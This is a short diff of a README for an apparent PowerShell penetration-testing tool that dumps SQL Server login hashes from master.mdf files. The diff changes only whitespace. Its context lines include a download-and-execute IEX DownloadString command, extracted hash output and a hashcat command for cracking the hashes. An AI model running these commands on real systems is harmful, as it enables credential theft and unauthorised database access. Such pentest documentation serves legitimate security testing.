@@ -16,7 +16,7 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubuserconte
 # Execute
 Invoke-DumpMDF
 ```
-  
+
 ## Example Output
 ```powershell
 PS> Invoke-DumpMDF
@@ -34,7 +34,7 @@ Value : 0x020043538738C5813669062A64AS0CC...
 ```
 hashcat.exe -m 1731 -a 0 -O 0x020050B40C7843AC5C196F9375549D3... Wordlists\rockyou.txt -r rules\best64.rule
 ```
-## Further Reading 
+## Further Reading
 - https://blog.xpnsec.com/extracting-master-mdf-hashes/
 - https://medium.com/@jacobdiamond/extracting-sql-user-hashes-leveraging-bak-files-for-mssql-server-access-in-ad-pentest-b42e7bbcc88c
 - https://github.com/xpn/Powershell-PostExploitation/blob/master/Invoke-MDFHashes/Get-MDFHashes.ps1
